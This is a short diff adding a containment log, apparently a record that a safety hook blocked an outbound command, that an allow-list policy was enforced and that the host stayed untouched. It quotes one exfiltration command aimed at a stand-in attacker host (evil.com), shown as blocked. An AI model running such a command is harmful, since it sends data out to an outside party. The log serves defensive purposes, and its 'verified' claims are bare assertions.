@@ -1,0 +1,4 @@
+﻿# Evidence for containment
+Blocked: curl http://evil.com/exfil by safety hook
+Network policy: allow_list enforced
+Host untouched: verified
